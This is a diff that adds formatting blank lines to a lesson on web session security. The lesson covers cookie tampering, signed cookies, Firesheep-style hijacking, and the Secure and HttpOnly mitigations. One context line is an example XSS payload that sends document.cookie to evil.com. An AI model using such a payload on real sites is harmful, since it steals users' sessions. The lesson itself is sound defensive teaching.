@@ -74,6 +74,7 @@ app.get('/', (req, res) => {
 ```
 
 This is extremely insecure because users can simply modify their cookie to impersonate any user:
+
 1. Log in as 'alice'
 2. Edit cookie to say 'username=bob'
 3. Now you're logged in as Bob!
@@ -105,6 +106,7 @@ app.get('/', (req, res) => {
 ```
 
 This prevents tampering, but has other problems:
+
 1. The signed cookie becomes a permanent credential - even after logout, anyone with a copy of the cookie can impersonate that user
 2. There is no way to invalidate sessions server-side.
 3. There is no way to list or terminate active sessions.
@@ -232,6 +234,7 @@ Session hijacking occurs when an attacker obtains a user's session ID and uses i
 ### Network-Based Attacks
 
 When HTTP traffic is unencrypted, attackers on the same network can intercept cookies. The infamous [Firesheep Firefox extension (2010)](https://en.wikipedia.org/wiki/Firesheep) demonstrated this by making it trivially easy to hijack Facebook and Twitter sessions over public WiFi. The extension would:
+
 1. Monitor network traffic for unencrypted requests to popular websites
 2. Extract session cookies from these requests
 3. Present a list of hijackable sessions to the attacker
@@ -240,6 +243,7 @@ When HTTP traffic is unencrypted, attackers on the same network can intercept co
 This attack was particularly effective because many sites only encrypted their login pages, leaving subsequent requests unprotected, despite those requests including session cookies.
 
 Mitigation:
+
 1. Use HTTPS everywhere to prevent eavesdropping
 2. Set the `Secure` flag on cookies to prevent them from being sent over HTTP:
 ```javascript
@@ -260,6 +264,7 @@ fetch('https://evil.com/steal?cookie=' + document.cookie);
 We will discuss this type of attack in detail in Lesson 7.
 
 Mitigation:
+
 1. Set the `HttpOnly` flag on session cookies to make them inaccessible to client JavaScript:
 ```javascript
 res.cookie('sessionId', sessionId, { httpOnly: true });
